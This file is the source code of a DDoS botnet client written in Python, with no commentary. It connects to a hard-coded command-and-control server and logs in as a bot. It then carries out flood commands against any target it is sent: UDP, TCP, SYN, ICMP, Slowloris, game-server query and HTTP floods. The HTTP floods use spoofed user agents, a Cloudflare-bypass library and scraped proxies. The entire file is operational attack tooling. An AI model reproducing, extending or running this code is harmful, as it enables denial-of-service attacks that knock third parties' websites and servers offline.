import socket,requests,threading,time,random,string,cloudscraper,httpx,urllib.request,urllib3.request
import requests as fake_headers
from os import urandom as randbytes
from fake_headers import Headers
from fake_useragent import FakeUserAgent,UserAgent

user_fake_list = []

 

C2_ADDRESS  = "192.168.56.101"
C2_PORT     = 6667

def user_gen():
    ua = FakeUserAgent()
    data = ua.random
    return data

def user_gen2():
    ua = UserAgent()
    data = ua.random
    return data

def rand_ua(mode):
    if "FakeUser" in mode:
        ua = user_gen()
    else:
        ua = user_gen2()
    return ua

def generate_url_path():
    msg = str(string.ascii_letters + string.digits + string.punctuation)
    data = "".join(random.sample(msg, 5))
    return data

def check_prox(array,secs, url,methods):
	ip = requests.post("http://randomapi.rf.gd/api/ip.php").text
	for prox in array:
		thread_list = []
		t = threading.Thread (target=check, args=(ip, prox,secs, url,methods))
		thread_list.append(t)
		t.start()

def check(ip,prox,secs,url,methods):
    
    try:
        ipx = requests.get("http://randomapi.rf.gd/api/ip.php", proxies={'http': "http://{}".format(prox), 'https':"http://{}".format(prox)}).text
    except:
        ipx = ip

    if ip != ipx:
        proxies={"http":"http://{}".format(prox), "https":"http://{}".format(prox)}
        while time.time() < secs:
            
            for _ in range(1500):
                headers = Headers(headers=True).generate()
                t = threading.Thread(target=ddos_http_req, args=(url, headers, proxies,methods))
                t.start()

def ddos_http_req(ip, headers, proxies,method):
    scraper = cloudscraper.create_scraper()
    scraper = cloudscraper.CloudScraper()
    s = requests.Session()
    if "get" in method:
         for _ in range(1500):
            requests.get(ip,headers=headers, proxies=proxies)
            scraper.get(ip,headers=headers,proxies=proxies)
    elif "post" in method:
        for _ in range(1500):
            requests.post(ip,headers=headers, proxies=proxies)
            scraper.post(ip,headers=headers,proxies=proxies)
    elif "put" in method:
        for _ in range(1500):
            requests.put(ip,headers=headers, proxies=proxies)
            scraper.put(ip,headers=headers,proxies=proxies)
    elif "patch" in method:
        for _ in range(1500):
            requests.patch(ip,headers=headers, proxies=proxies)
            scraper.patch(ip,headers=headers,proxies=proxies)
    elif "delete" in method:
        for _ in range(1500):
            requests.delete(ip,headers=headers, proxies=proxies)
            scraper.delete(ip,headers=headers,proxies=proxies)
    elif "head" in method:
        for _ in range(1500):
            requests.head(ip,headers=headers, proxies=proxies)
            scraper.head(ip,headers=headers,proxies=proxies)
    elif "options" in method:
        for _ in range(1500):
            requests.options(ip,headers=headers, proxies=proxies)
            scraper.options(ip,headers=headers,proxies=proxies)
    elif "all" in method:
        for _ in range(1500):
            requests.get(ip,headers=headers, proxies=proxies)
            scraper.get(ip,headers=headers,proxies=proxies)
            requests.post(ip,headers=headers, proxies=proxies)
            scraper.post(ip,headers=headers,proxies=proxies)
            requests.put(ip,headers=headers, proxies=proxies)
            scraper.put(ip,headers=headers,proxies=proxies)
            requests.patch(ip,headers=headers, proxies=proxies)
            scraper.patch(ip,headers=headers,proxies=proxies)
            requests.delete(ip,headers=headers, proxies=proxies)
            scraper.delete(ip,headers=headers,proxies=proxies)
            requests.head(ip,headers=headers, proxies=proxies)
            scraper.head(ip,headers=headers,proxies=proxies)
            requests.options(ip,headers=headers, proxies=proxies)
            scraper.options(ip,headers=headers,proxies=proxies)

def attack_udp_bypass(ip, port, secs, size):
    
    while time.time() < secs:
         
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        dport = random.randint(1, 65535) if port == 0 else port
        for _ in range(1500):
            data = randbytes(size)
            s.sendto(data, (ip, dport))
            s.sendto(data, (ip, dport))
            s.sendto(data, (ip, dport))
            s.sendto(data, (ip, dport))
            s.sendto(data, (ip, dport))
            s.sendto(data, (ip, dport))

def attack_tcp_bypass(ip, port, secs, size):
    
    while time.time() < secs:
         
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            s.connect((ip, port))
            while time.time() < secs:
                
                for _ in range(1500):
                    s.send(randbytes(size))
                    s.send(randbytes(size))
                    s.send(randbytes(size))
                    s.send(randbytes(size))
                    s.send(randbytes(size))
                    s.send(randbytes(size))
        except:
            pass
    
def attack_udp(ip, port, secs, size):
    
    while time.time() < secs:
         
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        dport = random.randint(1, 65535) if port == 0 else port
        for _ in range(1500):
            data = random._urandom(size)
            s.sendto(data, (ip, dport))
            s.sendto(data, (ip, dport))
            s.sendto(data, (ip, dport))
            s.sendto(data, (ip, dport))
            s.sendto(data, (ip, dport))
            s.sendto(data, (ip, dport))


def attack_tcp(ip, port, secs, size):
    
    while time.time() < secs:
         
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            s.connect((ip, port))
            while time.time() < secs:
                
                for _ in range(1500):
                    s.send(random._urandom(size))
                    s.send(random._urandom(size))
                    s.send(random._urandom(size))
                    s.send(random._urandom(size))
                    s.send(random._urandom(size))
                    s.send(random._urandom(size))
        except:
            pass

def attack_syn(ip, port, secs):
    
    while time.time() < secs:
         
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setblocking(0)
        try:
            dport = random.randint(1, 65535) if port == 0 else port
            s.connect((ip, dport)) # RST/ACK or SYN/ACK as response
            s.connect((ip, dport))
            s.connect((ip, dport))
            s.connect((ip, dport))
            s.connect((ip, dport))
            s.connect((ip, dport))
        except:
            pass

def attack_cc(ip, port, secs):
    
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect((ip, port))
        while time.time() < secs:
            
            for _ in range(1500):
                s.send("\000".encode())
                s.send("\000".encode())
                s.send("\000".encode())
                s.send("\000".encode())
                s.send("\000".encode())
                s.send("\000".encode())
    except:
        pass

def attack_http(ip, secs):
    
    while time.time() < secs:
         
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            s.connect((ip, 5050))
            while time.time() < secs:
                
                url = generate_url_path()
                for _ in range(1500):
                    s.send(f'GET /{url} HTTP/1.1\r\nHost: {ip}\r\nUser-Agent: {rand_ua("FakeUser")}\r\nConnection: keep-alive\r\n\r\n'.encode())
                    s.send(f'GET /{url} HTTP/1.1\r\nHost: {ip}\r\nUser-Agent: {rand_ua("User")}\r\nConnection: keep-alive\r\n\r\n'.encode())
                    s.send(f'GET /{url} HTTP/1.1\r\nHost: {ip}\r\nUser-Agent: {rand_ua("FakeUser")}\r\nConnection: keep-alive\r\n\r\n'.encode())
                    s.send(f'GET /{url} HTTP/1.1\r\nHost: {ip}\r\nUser-Agent: {rand_ua("User")}\r\nConnection: keep-alive\r\n\r\n'.encode())
                    s.send(f'GET /{url} HTTP/1.1\r\nHost: {ip}\r\nUser-Agent: {rand_ua("FakeUser")}\r\nConnection: keep-alive\r\n\r\n'.encode())
                    s.send(f'GET /{url} HTTP/1.1\r\nHost: {ip}\r\nUser-Agent: {rand_ua("User")}\r\nConnection: keep-alive\r\n\r\n'.encode())
        except:
            s.close()

def attack_http2(ip, port, secs):
    
    while time.time() < secs:
         
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            s.connect((ip, port))
            while time.time() < secs:
                
                url = generate_url_path()
                for _ in range(1500):
                    s.send(f'GET /{url} HTTP/1.1\r\nHost: {ip}\r\nUser-Agent: {rand_ua("User")}\r\nConnection: keep-alive\r\n\r\n'.encode())
                    s.send(f'GET /{url} HTTP/1.1\r\nHost: {ip}\r\nUser-Agent: {rand_ua("FakeUser")}\r\nConnection: keep-alive\r\n\r\n'.encode())
                    s.send(f'GET /{url} HTTP/1.1\r\nHost: {ip}\r\nUser-Agent: {rand_ua("User")}\r\nConnection: keep-alive\r\n\r\n'.encode())
                    s.send(f'GET /{url} HTTP/1.1\r\nHost: {ip}\r\nUser-Agent: {rand_ua("FakeUser")}\r\nConnection: keep-alive\r\n\r\n'.encode())
                    s.send(f'GET /{url} HTTP/1.1\r\nHost: {ip}\r\nUser-Agent: {rand_ua("User")}\r\nConnection: keep-alive\r\n\r\n'.encode())
        except:
            s.close()

def attack_pps(ip, port, secs):
    
    while time.time() < secs:
         
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            s.connect((ip, port))
            while time.time() < secs:
                
                for _ in range(1500):
                    s.send(f'GET / HTTP/1.1\r\n\r\n'.encode())
                    s.send(f'GET / HTTP/1.1\r\n\r\n'.encode())
                    s.send(f'GET / HTTP/1.1\r\n\r\n'.encode())
                    s.send(f'GET / HTTP/1.1\r\n\r\n'.encode())
                    s.send(f'GET / HTTP/1.1\r\n\r\n'.encode())
                    s.send(f'GET / HTTP/1.1\r\n\r\n'.encode())
        except:
            s.close()

def attack_std(ip, port, secs):
    
    payload = b'\x73\x74\x64\x00\x00\x00\x00\x00\x1e\x00\x01\x30\x02\xfd\xa8\xe3\x00\x00\x00\x00\x00\x00\x00\x00'
    while time.time() < secs:
         
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.sendto(payload, (ip, port))
        s.sendto(payload, (ip, port))
        s.sendto(payload, (ip, port))
        s.sendto(payload, (ip, port))
        s.sendto(payload, (ip, port))
        s.sendto(payload, (ip, port))

def attack_icmp(ip, port, secs, size):
    
    payload = b'\x08\x00\xbd\xcb\x16\x4f\x00\x01\x92\xde\xe2\x50\x00\x00\x00\x00\xe1\xe1\x0e\x00\x00\x00\x00\x00\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37'
    while time.time() < secs:
        
        s = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)
        dport = random.randint(1, 65535) if port == 0 else port
        data = random._urandom(size)
        s.sendto(payload, (ip, port))
        s.sendto(payload, (ip, port))
        s.sendto(payload, (ip, port))
        s.sendto(payload, (ip, port))
        s.sendto(payload, (ip, port))
        s.sendto(payload, (ip, port))

def attack_hex(ip, port, secs):
    
    payload = b'\x55\x55\x55\x55\x00\x00\x00\x01'
    while time.time() < secs:
         
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.sendto(payload, (ip, port))
        s.sendto(payload, (ip, port))
        s.sendto(payload, (ip, port))
        s.sendto(payload, (ip, port))
        s.sendto(payload, (ip, port))
        s.sendto(payload, (ip, port))

def attack_cpukill(ip, port, secs):
    
    payload = b'\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
    while time.time() < secs:
         
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.sendto(payload, (ip, port))
        s.sendto(payload, (ip, port))
        s.sendto(payload, (ip, port))
        s.sendto(payload, (ip, port))
        s.sendto(payload, (ip, port))
        s.sendto(payload, (ip, port))

def attack_junk(ip, port, secs):
    
    payload = b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
    while time.time() < secs:
         
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.sendto(payload, (ip, port))
        s.sendto(payload, (ip, port))
        s.sendto(payload, (ip, port))
        s.sendto(payload, (ip, port))
        s.sendto(payload, (ip, port))
        s.sendto(payload, (ip, port))

def attack_vse(ip, port, secs):
    
    payload = b'\xff\xff\xff\xffTSource Engine Query\x00'
    while time.time() < secs:
         
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.sendto(payload, (ip, port))
        s.sendto(payload, (ip, port))
        s.sendto(payload, (ip, port))
        s.sendto(payload, (ip, port))
        s.sendto(payload, (ip, port))
        s.sendto(payload, (ip, port))

def sloworis(ip,port,secs):
    
    sockets = []
    def setupSocket(ip,port):
        random_list = random.choice(("FakeUser","User"))
        headers_ua = ""
        if "FakeUser" in random_list:
            headers_ua = f'{rand_ua("FakeUser")}'
        else:
            headers_ua = f'{rand_ua("User")}'
        headers = [
            f"User-agent: {headers_ua}",
            "Accept-language: en-US,en"
        ]
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.settimeout(4)
        s.connect(ip,port)
        s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 1337)).encode("utf-8"))
        for header in headers:
            s.send("{}\r\n".format(header).encode("utf-8"))
        return s
    
    count = 1300
    
    for _ in range(count):
        try:
            sock = setupSocket(ip,port)
        except socket.error:
            break

        sockets.append(sock)
    
    while time.time() < secs:
         
        for sock in list(sockets):
            try:
                sock.send("X-a: {}\r\n".format(random.randint(1, 4600)).encode("utf-8"))
            except socket.error:
                sockets.remove(sock)
        for _ in range(count - len(sockets)):
            try:
                sock = setupSocket(ip,port)
                if sock:
                    sockets.append(sock)
            except socket.error:
                break
        time.sleep(15)

def CFB(url,method,secs):
    
    while time.time() < secs:
         
        random_list = random.choice(("FakeUser","User"))
        headers = ""
        if "FakeUser" in random_list:
            headers = {'User-Agent': f'{rand_ua("FakeUser")}'}
        else:
            headers = {'User-Agent': f'{rand_ua("User")}'}
        scraper = cloudscraper.create_scraper()
        scraper = cloudscraper.CloudScraper()
        if "get" in method:
            for _ in range(1500):
                scraper.get(url,headers=headers, timeout=15)
        elif "post" in method:
            for _ in range(1500):
                scraper.post(url,headers=headers, timeout=15)
        elif "patch" in method:
            for _ in range(1500):
                scraper.patch(url,headers=headers, timeout=15)
        elif "put" in method:
            for _ in range(1500):
                scraper.put(url,headers=headers, timeout=15)
        elif "head" in method:
            for _ in range(1500):
                scraper.head(url,headers=headers, timeout=15)
        elif "delete" in method:
            for _ in range(1500):
                scraper.delete(url,headers=headers, timeout=15)
        elif "options" in method:
            for _ in range(1500):
                scraper.options(url,headers=headers, timeout=15)
        elif "all" in method:
            for _ in range(1500):
                scraper.get(url,headers=headers, timeout=15)
                scraper.post(url,headers=headers, timeout=15)
                scraper.patch(url,headers=headers, timeout=15)
                scraper.put(url,headers=headers, timeout=15)
                scraper.head(url,headers=headers, timeout=15)
                scraper.delete(url,headers=headers, timeout=15)
                scraper.options(url,headers=headers, timeout=15)

def flooding_hell(url,secs):
    
    def packet(URL):
        for _ in range(2500):
            http2 = urllib3.PoolManager()
            http2.request("GET",URL)
            http2.request("PUT",URL)
            http2.request("POST",URL)
            http2.request("PATCH",URL)
            http2.request("HEAD",URL)
            http2.request("DELETE",URL)
            http2.request("OPTIONS",URL)
            req = urllib.request.urlopen(http2.request("GET",URL))
            req = urllib.request.urlopen(http2.request("PUT",URL))
            req = urllib.request.urlopen(http2.request("POST",URL))
            req = urllib.request.urlopen(http2.request("PATCH",URL))
            req = urllib.request.urlopen(http2.request("HEAD",URL))
            req = urllib.request.urlopen(http2.request("DELETE",URL))
            req = urllib.request.urlopen(http2.request("OPTIONS",URL))
            req = urllib.request.urlopen(url=URL)
            req = urllib.request.urlopen(urllib.request.Request(url=URL))

    def packet2(URL):
        for _ in range(2500):
            scraper = cloudscraper.create_scraper()
            scraper = cloudscraper.CloudScraper()
            req = scraper.get(url=URL)
            req = requests.get(url=URL)
            req = httpx.get(url=URL)
            req = scraper.put(url=URL)
            req = requests.put(url=URL)
            req = httpx.put(url=URL)
            req = scraper.post(url=URL)
            req = requests.post(url=URL)
            req = httpx.post(url=URL)
            req = scraper.patch(url=URL)
            req = requests.patch(url=URL)
            req = httpx.patch(url=URL)
            req = scraper.head(url=URL)
            req = requests.head(url=URL)
            req = httpx.head(url=URL)
            req = scraper.delete(url=URL)
            req = requests.delete(url=URL)
            req = httpx.delete(url=URL)
            req = scraper.options(url=URL)
            req = requests.options(url=URL)
            req = httpx.options(url=URL)

    while time.time() < secs:
         
        th1 = threading.Thread(target=packet,args=(url), daemon=True)
        th2 = threading.Thread(target=packet2,args=(url), daemon=True)
        th2.start()
        th1.start()

def REQ_attack(ip,method,secs):
     
     while time.time() < secs:
         
        random_list = random.choice(("FakeUser","User"))
        headers = ""
        if "FakeUser" in random_list:
            headers = {'User-Agent': f'{rand_ua("FakeUser")}'}
        else:
            headers = {'User-Agent': f'{rand_ua("User")}'}
        if "get" in method:
            for _ in range(1500):
                requests.get(ip,headers=headers)
        elif "post" in method:
            for _ in range(1500):
                requests.post(ip,headers=headers)
        elif "put" in method:
            for _ in range(1500):
                requests.put(ip,headers=headers)
        elif "patch" in method:
            for _ in range(1500):
                requests.patch(ip,headers=headers)
        elif "delete" in method:
            for _ in range(1500):
                requests.delete(ip,headers=headers)
        elif "head" in method:
            for _ in range(1500):
                requests.head(ip,headers=headers)
        elif "options" in method:
            for _ in range(1500):
                requests.options(ip,headers=headers)
        elif "all" in method:
            for _ in range(1500):
                requests.get(ip,headers=headers)
                requests.post(ip,headers=headers)
                requests.put(ip,headers=headers)
                requests.patch(ip,headers=headers)
                requests.delete(ip,headers=headers)
                requests.head(ip,headers=headers)
                requests.options(ip,headers=headers)

def main():
    
    c2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    c2.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
    while 1:
        try:
            c2.connect((C2_ADDRESS, C2_PORT))
            while 1:
                data = c2.recv(65536).decode()
                if 'Username' in data:
                    c2.send('BOT'.encode())
                    break
            while 1:
                data = c2.recv(65536).decode()
                if 'Password' in data:
                    c2.send('\xff\xff\xff\xff\75'.encode('cp1252'))
                    break
            break
        except:
            time.sleep(90)
    while 1:
        try:
            data = c2.recv(65536).decode().strip()
            if not data:
                break
            args = data.split(' ')
            command = args[0].upper()
            if command == '.ICMP':
                 
                ip = args[1]
                port = int(args[2])
                secs = time.time() + int(args[3])
                threads = int(args[4])

                for _ in range(threads):
                    threading.Thread(target=attack_icmp, args=(ip, port, secs), daemon=True).start()
            elif command == ".HTTP_REQ":
                 
                ip = args[1]
                url = args[1]
                method = args[2]
                method_old = args[2]
                secs = time.time() + int(args[3])
                mode = args[4]
                threads = int(args[5])
                if "1" in mode:
                    for _ in range(threads):
                        threading.Thread(target=REQ_attack, args=(ip,method, secs), daemon=True).start()
                        threading.Thread(target=REQ_attack, args=(ip,method, secs), daemon=True).start()
                        threading.Thread(target=REQ_attack, args=(ip,method, secs), daemon=True).start()
                        threading.Thread(target=REQ_attack, args=(ip,method, secs), daemon=True).start()
                        threading.Thread(target=REQ_attack, args=(ip,method, secs), daemon=True).start()
                        threading.Thread(target=REQ_attack, args=(ip,method, secs), daemon=True).start()
                elif "2" in mode:
                    for _ in range(threads):
                        threading.Thread(target=CFB, args=(ip,method, secs), daemon=True).start()
                elif "3" in mode:
                    for _ in range(threads):
                        threading.Thread(target=REQ_attack, args=(ip,method, secs), daemon=True).start()
                        threading.Thread(target=REQ_attack, args=(ip,method, secs), daemon=True).start()
                        threading.Thread(target=REQ_attack, args=(ip,method, secs), daemon=True).start()
                        threading.Thread(target=REQ_attack, args=(ip,method, secs), daemon=True).start()
                        threading.Thread(target=REQ_attack, args=(ip,method, secs), daemon=True).start()
                        threading.Thread(target=REQ_attack, args=(ip,method, secs), daemon=True).start()
                        threading.Thread(target=CFB, args=(ip,method, secs), daemon=True).start()
                elif "4" in mode:
                    for _ in range(threads):
                        threading.Thread(target=CFB, args=(ip,method, secs), daemon=True).start()
                        threading.Thread(target=CFB, args=(ip,method, secs), daemon=True).start()
                        threading.Thread(target=CFB, args=(ip,method, secs), daemon=True).start()
                        threading.Thread(target=CFB, args=(ip,method, secs), daemon=True).start()
                        threading.Thread(target=CFB, args=(ip,method, secs), daemon=True).start()
                elif "5" in mode:
                    for _ in range(threads):
                        threading.Thread(target=REQ_attack, args=(ip,method, secs), daemon=True).start()
                        threading.Thread(target=REQ_attack, args=(ip,method, secs), daemon=True).start()
                        threading.Thread(target=REQ_attack, args=(ip,method, secs), daemon=True).start()
                        threading.Thread(target=REQ_attack, args=(ip,method, secs), daemon=True).start()
                        threading.Thread(target=REQ_attack, args=(ip,method, secs), daemon=True).start()
                        threading.Thread(target=REQ_attack, args=(ip,method, secs), daemon=True).start()
                        threading.Thread(target=CFB, args=(ip,method, secs), daemon=True).start()
                        threading.Thread(target=CFB, args=(ip,method, secs), daemon=True).start()
                        threading.Thread(target=CFB, args=(ip,method, secs), daemon=True).start()
                        threading.Thread(target=CFB, args=(ip,method, secs), daemon=True).start()
                        threading.Thread(target=CFB, args=(ip,method, secs), daemon=True).start()
                elif "6" in mode:
                    for _ in range(threads):
                        threading.Thread(target=CFB, args=(ip,method, secs), daemon=True).start()
                        threading.Thread(target=CFB, args=(ip,method, secs), daemon=True).start()
                        threading.Thread(target=CFB, args=(ip,method, secs), daemon=True).start()
                        threading.Thread(target=CFB, args=(ip,method, secs), daemon=True).start()
                        threading.Thread(target=CFB, args=(ip,method, secs), daemon=True).start()
                        for _ in range(500):
                            threading.Thread(target=CFB, args=(ip,method, secs), daemon=True).start()
                            threading.Thread(target=CFB, args=(ip,method, secs), daemon=True).start()
                            threading.Thread(target=CFB, args=(ip,method, secs), daemon=True).start()
                            threading.Thread(target=CFB, args=(ip,method, secs), daemon=True).start()
                            threading.Thread(target=CFB, args=(ip,method, secs), daemon=True).start()
                elif "7" in mode:
                    for _ in range(threads):
                        threading.Thread(target=REQ_attack, args=(ip,method, secs), daemon=True).start()
                        threading.Thread(target=REQ_attack, args=(ip,method, secs), daemon=True).start()
                        threading.Thread(target=REQ_attack, args=(ip,method, secs), daemon=True).start()
                        threading.Thread(target=REQ_attack, args=(ip,method, secs), daemon=True).start()
                        threading.Thread(target=REQ_attack, args=(ip,method, secs), daemon=True).start()
                        threading.Thread(target=REQ_attack, args=(ip,method, secs), daemon=True).start()
                        threading.Thread(target=CFB, args=(ip,method, secs), daemon=True).start()
                        threading.Thread(target=CFB, args=(ip,method, secs), daemon=True).start()
                        threading.Thread(target=CFB, args=(ip,method, secs), daemon=True).start()
                        threading.Thread(target=CFB, args=(ip,method, secs), daemon=True).start()
                        threading.Thread(target=CFB, args=(ip,method, secs), daemon=True).start()
                        for _ in range(500):
                            threading.Thread(target=REQ_attack, args=(ip,method, secs), daemon=True).start()
                            threading.Thread(target=REQ_attack, args=(ip,method, secs), daemon=True).start()
                            threading.Thread(target=REQ_attack, args=(ip,method, secs), daemon=True).start()
                            threading.Thread(target=REQ_attack, args=(ip,method, secs), daemon=True).start()
                            threading.Thread(target=REQ_attack, args=(ip,method, secs), daemon=True).start()
                            threading.Thread(target=REQ_attack, args=(ip,method, secs), daemon=True).start()
                            threading.Thread(target=CFB, args=(ip,method, secs), daemon=True).start()
                            threading.Thread(target=CFB, args=(ip,method, secs), daemon=True).start()
                            threading.Thread(target=CFB, args=(ip,method, secs), daemon=True).start()
                            threading.Thread(target=CFB, args=(ip,method, secs), daemon=True).start()
                            threading.Thread(target=CFB, args=(ip,method, secs), daemon=True).start()
                elif "8" in mode:
                    for _ in range(threads):
                        threading.Thread(target=REQ_attack, args=(ip,method, secs), daemon=True).start()
                        threading.Thread(target=CFB, args=(ip,method, secs), daemon=True).start()
                        for _ in range(500):
                            threading.Thread(target=REQ_attack, args=(ip,method, secs), daemon=True).start()
                            threading.Thread(target=CFB, args=(ip,method, secs), daemon=True).start()
                elif "9" in mode:
                    for _ in range(threads):
                        threading.Thread(target=REQ_attack, args=(ip,method, secs), daemon=True).start()
                        threading.Thread(target=CFB, args=(ip,method, secs), daemon=True).start()
                elif "10" in mode:
                    for _ in range(threads):
                        threading.Thread(target=flooding_hell, args=(url, secs), daemon=True).start()
                elif "11" in mode:
                    for _ in range(threads):
                        threading.Thread(target=flooding_hell, args=(url, secs), daemon=True).start()
                        threading.Thread(target=REQ_attack, args=(ip,method, secs), daemon=True).start()
                        threading.Thread(target=CFB, args=(ip,method, secs), daemon=True).start()
                elif "12" in mode:
                    for _ in range(threads):
                        threading.Thread(target=flooding_hell, args=(url, secs), daemon=True).start()
                        threading.Thread(target=flooding_hell, args=(url, secs), daemon=True).start()
                        threading.Thread(target=flooding_hell, args=(url, secs), daemon=True).start()
                        threading.Thread(target=flooding_hell, args=(url, secs), daemon=True).start()
                        threading.Thread(target=flooding_hell, args=(url, secs), daemon=True).start()
                        threading.Thread(target=flooding_hell, args=(url, secs), daemon=True).start()
                elif "13" in mode:
                    for _ in range(threads):
                        threading.Thread(target=flooding_hell, args=(url, secs), daemon=True).start()
                        threading.Thread(target=flooding_hell, args=(url, secs), daemon=True).start()
                        threading.Thread(target=flooding_hell, args=(url, secs), daemon=True).start()
                        threading.Thread(target=flooding_hell, args=(url, secs), daemon=True).start()
                        threading.Thread(target=flooding_hell, args=(url, secs), daemon=True).start()
                        threading.Thread(target=flooding_hell, args=(url, secs), daemon=True).start()
                        threading.Thread(target=REQ_attack, args=(ip,method, secs), daemon=True).start()
                        threading.Thread(target=REQ_attack, args=(ip,method, secs), daemon=True).start()
                        threading.Thread(target=REQ_attack, args=(ip,method, secs), daemon=True).start()
                        threading.Thread(target=REQ_attack, args=(ip,method, secs), daemon=True).start()
                        threading.Thread(target=REQ_attack, args=(ip,method, secs), daemon=True).start()
                        threading.Thread(target=REQ_attack, args=(ip,method, secs), daemon=True).start()
                        threading.Thread(target=CFB, args=(ip,method, secs), daemon=True).start()
                        threading.Thread(target=CFB, args=(ip,method, secs), daemon=True).start()
                        threading.Thread(target=CFB, args=(ip,method, secs), daemon=True).start()
                        threading.Thread(target=CFB, args=(ip,method, secs), daemon=True).start()
                        threading.Thread(target=CFB, args=(ip,method, secs), daemon=True).start()
                elif "14" in mode:
                    for _ in range(threads):
                        country = str(random.choice(("LA","JP","CZ","HK","CY","SE","CH","TH","PK","US","SY","EN","RU","CU","AL","JO","CA","PA","GE","ME","ES","BA","GR","DE","VE","IT","IR","BO","BR","NO","FR","SI","SA","IN","DO","NI","all")))
                        req = requests.get("https://api.proxyscrape.com/v2/?request=displayproxies&country="+country+'')
                        array = req.text.split()
                        check_prox(array,secs, url,method)
                elif "15" in mode:
                    country = str(random.choice(("LA","JP","CZ","CY","SE","CH","HK","TH","US","PK","EN","SY","RU","CU","AL","JO","CA","PA","GE","ME","ES","BA","GR","DE","VE","IT","IR","BO","BR","NO","FR","SI","SA","IN","DO","NI","all")))
                    req = requests.get("https://api.proxyscrape.com/v2/?request=displayproxies&country="+country+'')
                    array = req.text.split()
                    for _ in range(threads):
                        check_prox(array,secs, url,method)
                elif "16" in mode:
                    for _ in range(threads):
                        country = str(random.choice(("LA","JP","CZ","CY","SE","CH","HK","TH","US","PK","EN","SY","RU","CU","AL","JO","CA","PA","GE","ME","ES","BA","GR","DE","VE","IT","IR","BO","BR","NO","FR","SI","SA","IN","DO","NI","all")))
                        req = requests.get("https://api.proxyscrape.com/v2/?request=displayproxies&country="+country+'')
                        array = req.text.split()
                        check_prox(array,secs, url,method)
                        check_prox(array,secs, url,method)
                        check_prox(array,secs, url,method)
                        check_prox(array,secs, url,method)
                        check_prox(array,secs, url,method)
                elif "17" in mode:
                    country = str(random.choice(("LA","JP","CZ","CY","SE","CH","TH","US","HK","EN","RU","PK","SY","CU","AL","JO","CA","PA","GE","ME","ES","BA","GR","DE","VE","IT","IR","BO","BR","NO","FR","SI","SA","IN","DO","NI","all")))
                    req = requests.get("https://api.proxyscrape.com/v2/?request=displayproxies&country="+country+'')
                    array = req.text.split()
                    for _ in range(threads):
                        check_prox(array,secs, url,method)
                        check_prox(array,secs, url,method)
                        check_prox(array,secs, url,method)
                        check_prox(array,secs, url,method)
                        check_prox(array,secs, url,method)
            elif command == '.UDP':
                 
                ip = args[1]
                port = int(args[2])
                secs = time.time() + int(args[3])
                size = int(args[4])
                threads = int(args[5])

                for _ in range(threads):
                    threading.Thread(target=attack_udp, args=(ip, port, secs, size), daemon=True).start()
            elif command == '.TCP':
                 
                ip = args[1]
                port = int(args[2])
                secs = time.time() + int(args[3])
                size = int(args[4])
                threads = int(args[5])

                for _ in range(threads):
                    threading.Thread(target=attack_tcp, args=(ip, port, secs, size), daemon=True).start()
            elif command == '.UDP_BYPASS':
                 
                ip = args[1]
                port = int(args[2])
                secs = time.time() + int(args[3])
                size = int(args[4])
                threads = int(args[5])

                for _ in range(threads):
                    threading.Thread(target=attack_udp_bypass, args=(ip, port, secs, size), daemon=True).start()
            elif command == '.TCP_BYPASS':
                 
                ip = args[1]
                port = int(args[2])
                secs = time.time() + int(args[3])
                size = int(args[4])
                threads = int(args[5])

                for _ in range(threads):
                    threading.Thread(target=attack_tcp_bypass, args=(ip, port, secs, size), daemon=True).start()
            elif command == '.TUP_BYPASS':
                 
                ip = args[1]
                port = int(args[2])
                secs = time.time() + int(args[3])
                size = int(args[4])
                threads = int(args[5])

                for _ in range(threads):
                    threading.Thread(target=attack_tcp_bypass, args=(ip, port, secs, size), daemon=True).start()
                    threading.Thread(target=attack_udp_bypass, args=(ip, port, secs, size), daemon=True).start()
            elif command == '.TUP_NEW':
                 
                ip = args[1]
                port = int(args[2])
                secs = time.time() + int(args[3])
                size = int(args[4])
                threads = int(args[5])

                for _ in range(threads):
                    threading.Thread(target=attack_tcp, args=(ip, port, secs, size), daemon=True).start()
                    threading.Thread(target=attack_tcp_bypass, args=(ip, port, secs, size), daemon=True).start()
                    threading.Thread(target=attack_udp, args=(ip, port, secs, size), daemon=True).start()
                    threading.Thread(target=attack_udp_bypass, args=(ip, port, secs, size), daemon=True).start()
            elif command == '.CC':
                 
                ip = args[1]
                port = int(args[2])
                secs = time.time() + int(args[3])
                threads = int(args[4])

                for _ in range(threads):
                    threading.Thread(target=attack_cc, args=(ip, port, secs), daemon=True).start()
            elif command == '.SYN':
                 
                ip = args[1]
                port = int(args[2])
                secs = time.time() + int(args[3])
                threads = int(args[4])

                for _ in range(threads):
                    threading.Thread(target=attack_syn, args=(ip, port, secs), daemon=True).start()
